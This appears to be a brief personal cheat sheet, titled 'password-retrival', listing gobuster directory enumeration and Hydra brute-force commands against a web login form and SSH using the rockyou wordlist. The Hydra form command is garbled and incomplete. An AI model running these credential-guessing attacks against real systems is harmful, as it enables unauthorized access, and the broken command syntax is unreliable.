# password-retrival

Using go gobuster
Hydra and more 


gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password1<IP>=^PASS^:

hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <IP>-t 4 ssh 



 
